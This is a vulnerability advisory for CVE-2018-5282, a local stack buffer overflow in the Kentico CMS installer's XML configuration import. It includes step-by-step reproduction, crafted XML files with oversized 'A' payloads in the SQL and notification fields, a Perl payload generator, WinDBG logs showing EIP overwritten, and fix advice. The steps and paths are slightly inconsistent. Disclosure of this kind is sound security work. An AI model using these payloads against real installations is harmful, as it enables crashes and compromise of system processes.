@@ -1,0 +1,225 @@
+Document Title:
+===============
+Kentico CMS v11.0 - Stack Buffer Overflow Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=1943
+
+http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-5282
+
+CVE-ID:
+=======
+CVE-2018-5282
+
+
+Release Date:
+=============
+2018-01-04
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1943
+
+
+Common Vulnerability Scoring System:
+====================================
+6
+
+
+Vulnerability Class:
+====================
+Buffer Overflow
+
+
+Current Estimated Price:
+========================
+2.000€ - 3.000€
+
+
+Product & Service Introduction:
+===============================
+Kentico is the only fully integrated ASP.NET CMS, E-commerce, and Online Marketing platform that allows you to create cutting-edge 
+websites and optimize your digital customers’ experiences fully across multiple channels. Kentico saves you time and resources so 
+you can accomplish more. Giving you the power to improve and refine your digital strategy, align it with the needs of your customers, 
+and create unique user experiences, Kentico 9 accelerates customer loyalty through new technologies. 
+
+(Copy of the Homepage: http://www.kentico.com/product/kentico9 )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered a stack buffer overflow vulnerability in the official Kentico v9.0, v10.0 & v11.0 content management system software.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2018-01-04: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Kentico Software
+Product: Kentico - Content Management System (eCommerce Software) 9.0
+
+Kentico Software
+Product: Kentico - Content Management System (eCommerce Software) 10.0
+
+Kentico Software
+Product: Kentico - Content Management System (eCommerce Software) 11.0
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+A local stack buffer overflow vulnerability has been discovered in the official Kentico v9.0, v10.0 & v11.0 content management system software.
+The buffer overflow vulnerability allows local attackers to compromise the local system process by an overwrite of the active registers.
+
+The local buffer overflow vulnerability is located in the `Load XML Configuration` module for file imports. The xml file impact input 
+data of the configuration for the software. In several values of the xml file the inputs are not recognized by an approval of the secure 
+software validation mechanism. The iis configuration settings are connected to a secure validation process, the sql install database 
+information in the xml file are not. The non-exisiting input validation and the unrestricted context size allows local attackers to 
+trigger a stack buffer overflow vulnerability. That results in compromise of the software process with system privileges.
+
+The security risk of the local buffer overflow vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.0. 
+Exploitation of the stack buffer overflow vulnerability requires a low privilege or restricted system user account without user interaction. 
+Successful exploitation of the vulnerability results in overwrite of the active registers to compromise of the computer system or process.
+
+Vulnerable Module(s):
+[+] Load XML Configuration
+
+
+Proof of Concept (PoC):
+=======================
+The local buffer overflow vulnerability can be exploited by local attackers with low privileged or restricted system user account without user interaction.
+For security demonstration or to reproduce the software vulnerability follow the provided information and steps below to continue the process.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Download the newst software version of the Kentico cms (v9.0.x - 9.0.5981.23486)
+2. Accept the program conditions and click to custom installation
+3. Open the local hosted xml poc file
+4. Include a large unicode payload to the marked values
+5. Save the xml file on your localhost
+6. Move back to the kentico v9.x installation process with the custom install screen
+Note: Attach a debugger to followup with the overwrite on the active registers
+7. Load the xml poc file by usage of the import function of kentico (left|buttom)
+8. The vulnerable values loaded and the process will permanently crash with different exceptions
+9. Move back to the debugger that is attached to the active software process and followup with an overwrite of the active ecx, ebp or eip registers
+10. Successful reproduce of the local buffer overflow vulnerability!
+
+
+PoC: Vulnerable Source (XML)
+<SilentInstall Log="True" LogFile="" OnError="Stop" CheckRequirements="False" ShowProgress="CommandPrompt">
+  <Setup InstallOnlyProgramFiles="False" Location="Local" SetupFolder="C:Program Files (x86)Kentico9.0" NET="4.5" OpenAfterInstall="True" 
+DeleteExisting="False" DoNotOverwriteInstallation="True" RegisterCounters="False" InstallWinServices="False" RegisterApplicationToEventLog="False" 
+WebProject="WebApplication" KillRunningProcesses="False" EnableModuleUsageTracking="True" />
+  <Sql InstallDatabase="True" Server="127.0.0.1" Authentication="SQL" 
+SqlName="[INCLUDE UNICODE PAYLOAD HERE TO TRIGGER THE BOF!]" 
+SqlPswd="[INCLUDE UNICODE PAYLOAD HERE TO TRIGGER THE BOF!]" 
+Database="[INCLUDE UNICODE PAYLOAD HERE TO TRIGGER THE BOF!]" Operation="" Collation="SQL_Latin1_General_CP1_CI_AS" Schema="" DeleteExisting="False" />
+  <IIS Website="" TargetFolder="C:inetpubwwwrootKentico9" DeleteExisting="GetUnique" KillRunningProcesses="False" />
+  <Modules type="InstallAll" />
+  <WebTemplates type="InstallAll" />
+  <UICultures type="InstallAll" />
+  <Dictionaries type="InstallAll" />
+  <WebSites />
+  <Licenses />
+  <Notification Enabled="False" Server="[INCLUDE UNICODE PAYLOAD HERE TO TRIGGER THE BOF!]" 
+UserName="[INCLUDE UNICODE PAYLOAD HERE TO TRIGGER THE BOF!]" 
+Password="[INCLUDE UNICODE PAYLOAD HERE TO TRIGGER THE BOF!]" 
+SSL="False" From="" To="" Subject="" AttachLogFile="True" />
+</SilentInstall>
+
+Note: Start the software exe file kentico v9.0 on windows, attach the windows debugger and load the xml config file to overwrite the ecx and eip registers.
+The installation path and the iis website values are not exploitable, because of the active content restrictions of the process that drops an invalid 
+argument exception to prevent.
+
+
+PoC: Exploit Code (XML)
+<SilentInstall Log="True" LogFile="" OnError="Stop" CheckRequirements="False" ShowProgress="CommandPrompt">
+  <Setup InstallOnlyProgramFiles="False" Location="Local" SetupFolder="C:Program Files (x86)Kentico9.0" NET="4.5" OpenAfterInstall="True" DeleteExisting="False" 
+DoNotOverwriteInstallation="True" RegisterCounters="True" InstallWinServices="True" RegisterApplicationToEventLog="True" 
+WebProject="WebApplication" KillRunningProcesses="True" EnableModuleUsageTracking="True" />
+  <Sql InstallDatabase="True" Server="127.0.0.1" Authentication="SQL" 
+SqlName="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+" 
+SqlPswd="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+" 
+Database="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+" 
+Operation="" Collation="SQL_Latin1_General_CP1_CI_AS" Schema="" DeleteExisting="False" />
+  <IIS Website="" TargetFolder="C:inetpubwwwrootKentico9" DeleteExisting="GetUnique" KillRunningProcesses="False" />
+  <Modules type="InstallAll" />
+  <WebTemplates type="InstallAll" />
+  <UICultures type="InstallAll" />
+  <Dictionaries type="InstallAll" />
+  <WebSites />
+  <Licenses />
+  <Notification Enabled="False" Server="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+" UserName="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+" Password="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+" SSL="False" From="" To="" Subject="" AttachLogFile="True" />
+</SilentInstall>
+
+
+PoC: Exploitation (Perl)
+#!/usr/bin/perl
+my $Buff = "A" x 3000;
+open(MYFILE,'>>kentico_unicode_payload.txt');
+print MYFILE $Buff;
+close(MYFILE);
+print "PoC (c) Vulnerability-Laboratory";
+
+
+--- PoC Debug Session Logs [WinDBG] ---
+(1522.21ec): Stack buffer overflow - code c0000409
+eax=00000000 ebx=0044b208 ecx=00410041 edx=513cc7c2 esi=003a22d0 edi=00477cd0
+eip=41004100 esp=00000000 ebp=00000000 iopl=0         nv up ei pl nz na po nc
+cs=001c  ss=0022  ds=0022  es=0022  fs=002c  gs=0000             efl=00000000
+41414141 cc22
+-
+EXCEPTION_RECORD:  ffffffff -- (.exr ffffffffffffffff)
+ExceptionAddress: 41414141
+   ExceptionCode: c0000409 (Stack Buffer Overflow)
+  ExceptionFlags: 00000001
+NumberParameters: 1
+   Parameter[0]: 00000002
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched by a secure file size and input character restriction like on the iis scheme website input.
+Parse the full xml file on import and restrict the memory size on imports to prevent further buffer overflow attacks.
+
+
+Security Risk:
+==============
+The security risk of the local stack buffer overflow vulnerability in the kentico cms software is estimated as high. (CVSS 6.0)
+
+
+Credits & Authors:
+==================
+Benjamin K.M. [bkm@vulnerability-lab.com] - https://www.vulnerability-lab.com/show.php?user=Benjamin+K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
+implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
+case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
+suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
+or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
+websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
+or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
+phone numbers, conversations or anything else to journalists, investigative authorities or private individuals.
